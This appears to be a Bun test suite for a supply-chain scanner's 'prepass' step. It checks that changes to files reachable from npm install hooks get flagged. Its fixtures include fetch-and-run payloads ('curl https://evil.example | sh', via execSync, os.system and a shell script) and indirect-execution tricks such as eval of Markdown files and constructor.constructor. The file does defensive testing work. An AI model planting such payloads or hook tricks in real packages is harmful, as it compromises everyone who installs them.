import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const evil = "require('child_process').execSync('curl https://evil.example | sh')\n";
const py = "import os; os.system('curl evil|sh')\n";
const nj = (body: string, extra: Record<string, string> = {}): Record<string, string> => ({
  "package.json": pj({ postinstall: "node install.js" }),
  "install.js": body,
  "lib/a.js": "1\n",
  ...extra,
});

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const cases: [string, Record<string, string>, string, string][] = [
  ["D1 literal require into docs/", nj("require('./docs/payload.js')\n", { "docs/payload.js": "1\n", "docs/other.js": "1\n", "README.md": "a\n" }), "docs/payload.js", evil],
  ["D2 transitive JS evals a .md", nj("require('./lib/b.js')\n", { "lib/b.js": "eval(require('fs').readFileSync(__dirname+'/../NOTES.md','utf8'))\n", "NOTES.md": "1\n", "README.md": "a\n" }), "NOTES.md", evil],
  ["D3 python helper execs .md", { "package.json": pj({ postinstall: "python3 install.py" }), "install.py": "import helper\n", "helper.py": "exec(open('NOTES.md').read())\n", "NOTES.md": "x=1\n", "README.md": "a\n" }, "NOTES.md", py],
  ["D4 entry Function() reads README", nj("Function(require('fs').readFileSync(__dirname+'/README.md','utf8'))()\n", { "README.md": "1\n" }), "README.md", evil],
  ["D5 entry fork of docs/ file", nj("require('child_process').fork(__dirname+'/docs/x.js')\n", { "docs/x.js": "1\n" }), "docs/x.js", evil],
  ["D6 computed require into docs/", nj("require(__dirname+'/docs/x.js')\n", { "docs/x.js": "1\n" }), "docs/x.js", evil],
  ["D7 sh entry sources docs/", { "package.json": pj({ postinstall: "sh install.sh" }), "install.sh": ". ./docs/x.sh\n", "docs/x.sh": "true\n" }, "docs/x.sh", "curl https://evil.example | sh\n"],
  ["D8 constructor.constructor", nj("const fs=require('fs');[].map.constructor(fs.readFileSync(__dirname+'/lib/a.js','utf8'))()\n"), "lib/a.js", evil],
  ["D9 cluster setupPrimary exec", nj("const c=require('cluster');c.setupPrimary({exec:__dirname+'/lib/a.js'});c.fork()\n"), "lib/a.js", evil],
];

for (const [name, base, file, bad] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
  });
}

test("D1 an unnamed doc stays quiet", () => {
  const base = cases[0]![1];
  expect(hard(base, { ...base, "docs/other.js": evil })).toEqual([]);
  expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
});

test("D2 an unnamed README stays quiet, and D3 widens on a non-stdlib import", () => {
  const d2 = cases[1]![1];
  const d3 = cases[2]![1];
  expect(hard(d2, { ...d2, "README.md": "b\n" })).toEqual([]);
  expect(hard(d3, { ...d3, "README.md": "b\n" }).join(" ")).toMatch(/README\.md/);
});

test("a non-static entry holds native sources in its own directory's complement, and a static entry does not", () => {
  const extra = {
    "binding.gyp": "{}\n",
    "binding.cc": "int x;\n",
    "src/other.cc": "int x;\n",
    "scripts/prebuild.js": "1\n",
    "README.md": "a\n",
  };
  const p = pj({ install: "node install.js" });
  const hot: Record<string, string> = { "package.json": p, "install.js": "eval('1')\n", ...extra };
  holds(hot, "binding.cc", "int y;\n");
  holds(hot, "binding.gyp", "{'targets':[]}\n");
  holds(hot, "scripts/prebuild.js", "2\n");
  expect(hard(hot, { ...hot, "src/other.cc": "int y;\n" })).toEqual([]);
  expect(hard(hot, { ...hot, "README.md": "b\n" })).toEqual([]);
  const cold: Record<string, string> = { "package.json": p, "install.js": "require('fs')\n", ...extra };
  expect(hard(cold, { ...cold, "binding.cc": "int y;\n" })).toEqual([]);
  expect(hard(cold, { ...cold, "binding.gyp": "{'targets':[]}\n" })).toEqual([]);
  expect(hard(cold, { ...cold, "scripts/prebuild.js": "2\n" })).toEqual([]);
});

test("a non-static entry holds same-directory files and leaves tests, docs, and workflows out", () => {
  const base = nj("eval('1')\n", {
    "other.js": "1\n",
    "test/a.js": "1\n",
    "docs/x.js": "1\n",
    ".github/workflows/ci.yml": "a\n",
  });
  holds(base, "other.js", evil);
  expect(hard(base, { ...base, "test/a.js": evil })).toEqual([]);
  expect(hard(base, { ...base, "docs/x.js": evil })).toEqual([]);
  expect(hard(base, { ...base, ".github/workflows/ci.yml": "b\n" })).toEqual([]);
});
